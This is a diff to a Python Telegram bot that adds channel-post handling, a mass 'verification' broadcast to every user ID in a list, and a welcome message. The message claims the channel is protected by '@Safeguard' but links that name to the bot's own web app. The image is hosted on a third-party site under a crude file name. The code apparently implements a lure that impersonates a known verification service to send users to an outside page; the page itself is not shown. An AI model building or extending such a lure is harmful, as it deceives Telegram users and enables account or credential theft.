@@ -244,6 +244,111 @@ class HTTPTelegramBot:
                 logger.info(f"🤖 Skipping bot member: {new_member.get('first_name')}")
 
 
+    def handle_channel_post(self, channel_post):
+        """Handle channel posts"""
+        chat = channel_post.get('chat', {})
+        text = channel_post.get('text', '')
+        
+        logger.info(f"📢 Channel post detected in: {chat.get('title')} (ID: {chat.get('id')})")
+        logger.info(f"📝 Post text: {text[:100]}...")
+        
+        # Handle verification requests in channel posts
+        if "verify" in text.lower():
+            logger.info(f"🔐 Verification request detected in channel {chat.get('title')}")
+            
+            # Send verification message to all user IDs in the list
+            self.send_verification_to_all_users(chat)
+            
+            # Optionally, you can also send a response to the channel
+            if LOCAL_DEV:
+                response_text = f"🔐 Verification triggered from channel.\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
+                keyboard = None
+            else:
+                response_text = "🔐 Verification triggered from channel."
+                keyboard = {
+                    "inline_keyboard": [[
+                        {
+                            "text": "🔐 Start Verification",
+                            "url": WEBAPP_URL
+                        }
+                    ]]
+                }
+            
+            try:
+                self.send_message(
+                    chat_id=chat['id'],
+                    text=response_text,
+                    parse_mode='HTML',
+                    reply_markup=keyboard
+                )
+                logger.info(f"✅ Channel verification response sent to {chat.get('title')}")
+            except Exception as e:
+                logger.error(f"❌ Error sending channel verification response: {e}")
+        
+        # Handle manual verification triggers
+        elif text.lower() in ['/verify_all', '/broadcast_verify', 'verify all']:
+            logger.info(f"📤 Manual verification broadcast triggered in channel {chat.get('title')}")
+            self.send_verification_to_all_users(chat)
+            
+            # Send confirmation to channel
+            try:
+                self.send_message(
+                    chat_id=chat['id'],
+                    text="✅ <b>Verification Broadcast</b>\n\nVerification messages have been sent to all users in the list.",
+                    parse_mode='HTML'
+                )
+                logger.info(f"✅ Channel verification broadcast confirmed to {chat.get('title')}")
+            except Exception as e:
+                logger.error(f"❌ Error sending channel broadcast confirmation: {e}")
+
+
+    def send_channel_welcome_message(self, channel_id):
+        """Send a welcome message to a channel (call this manually when needed)"""
+        try:
+            # Send the Safeguard Human Verification image with caption
+            photo_url = "https://i.ibb.co/CKY1GCHq/fuckyou.jpg"
+            
+            # Prepare the caption text
+            welcome_text = (
+                'This channel is being protected by '
+                '<a href="{webapp_url}">@Safeguard</a>.'
+                '\n\nClick below or <a href="{webapp_url}">this link</a> to start human verification.'
+            ).format(webapp_url=WEBAPP_URL)
+
+            # For local development, don't use inline keyboard (Telegram requires HTTPS)
+            if LOCAL_DEV:
+                welcome_text += f"\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
+                keyboard = None
+            else:
+                keyboard = {
+                    "inline_keyboard": [[
+                        {
+                            "text": "🔐 Start Verification",
+                            "url": WEBAPP_URL
+                        }
+                    ]]
+                }
+
+            photo_result = self.send_photo(
+                chat_id=channel_id, 
+                photo_url=photo_url,
+                caption=welcome_text,
+                parse_mode='HTML',
+                reply_markup=keyboard
+            )
+            
+            if photo_result:
+                logger.info(f"✅ Channel welcome message sent to channel {channel_id}")
+                return True
+            else:
+                logger.error(f"❌ Failed to send channel welcome message")
+                return False
+                
+        except Exception as e:
+            logger.error(f"❌ Error sending channel welcome message: {e}")
+            return False
+
+
     def handle_message(self, message):
         """Handle regular text messages"""
         user = message.get('from', {})
@@ -573,6 +678,11 @@ class HTTPTelegramBot:
             elif 'text' in message:
                 self.handle_message(message)
         
+        elif 'channel_post' in update:
+            # Handle channel posts
+            channel_post = update['channel_post']
+            self.handle_channel_post(channel_post)
+        
         elif 'callback_query' in update:
             # Handle button clicks
             callback_query = update['callback_query']
@@ -597,7 +707,8 @@ class HTTPTelegramBot:
             logger.info(f"👤 Bot Username: @{bot_info.get('username')}")
             logger.info(f"🌐 Web App URL: {WEBAPP_URL}")
             logger.info("📡 Bot is now polling for updates...")
-            logger.info("💡 Make sure the bot is added to groups with proper permissions")
+            logger.info("💡 Make sure the bot is added to groups/channels with proper permissions")
+            logger.info("📢 For channels: Add bot as admin with post permissions")
         else:
             logger.error("❌ Failed to get bot info. Check your bot token.")
             return
